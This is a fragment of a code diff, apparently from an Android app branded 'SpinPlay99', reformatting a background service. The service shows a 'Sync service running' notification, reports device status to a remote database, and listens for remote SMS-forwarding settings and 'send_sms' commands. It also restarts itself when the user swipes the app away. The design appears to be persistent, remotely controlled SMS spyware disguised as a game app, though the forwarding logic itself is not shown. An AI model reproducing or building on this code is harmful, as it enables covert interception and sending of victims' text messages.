+            channel.setDescription("Background data synchronization");
+            
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
     }
 
     private Notification createNotification() {
         Intent intent = new Intent(this, MainActivity.class);
-        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
+        PendingIntent pendingIntent = PendingIntent.getActivity(
+            this, 
+            0, 
+            intent, 
+            PendingIntent.FLAG_IMMUTABLE
+        );
+
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle(getString(R.string.notification_title))
-                .setContentText(getString(R.string.notification_text))
+                .setContentTitle("SpinPlay99")
+                .setContentText("Sync service running...")
                 .setSmallIcon(android.R.drawable.ic_menu_manage)
-                .setContentIntent(pi)
+                .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
     }
 
     @Override
-    public IBinder onBind(Intent intent) { return null; }
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     @Override
     public void onDestroy() {
+        // Set offline status
         mDatabase.child("devices").child(deviceId).child("online_status").setValue(false);
-        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
-        if (forwardingSettingsListener != null) 
-            mDatabase.child("devices").child(deviceId).child("forwarding_settings")
+        
+        // Remove callbacks
+        if (handler != null && syncRunnable != null) {
+            handler.removeCallbacks(syncRunnable);
+        }
+        
+        // Remove listeners
+        if (forwardingSettingsListener != null) {
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("forwarding_settings")
                     .removeEventListener(forwardingSettingsListener);
-        if (manualSmsListener != null)
-            mDatabase.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+        }
+        
+        if (manualSmsListener != null) {
+            mDatabase.child("devices")
+                    .child(deviceId)
+                    .child("manual_commands")
+                    .child("send_sms")
                     .removeEventListener(manualSmsListener);
+        }
+        
         super.onDestroy();
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        startService(new Intent(getApplicationContext(), BackgroundSyncService.class));
+        // Restart service when app is swiped away
+        Intent restartIntent = new Intent(getApplicationContext(), BackgroundSyncService.class);
+        startService(restartIntent);
         super.onTaskRemoved(rootIntent);
     }
 }
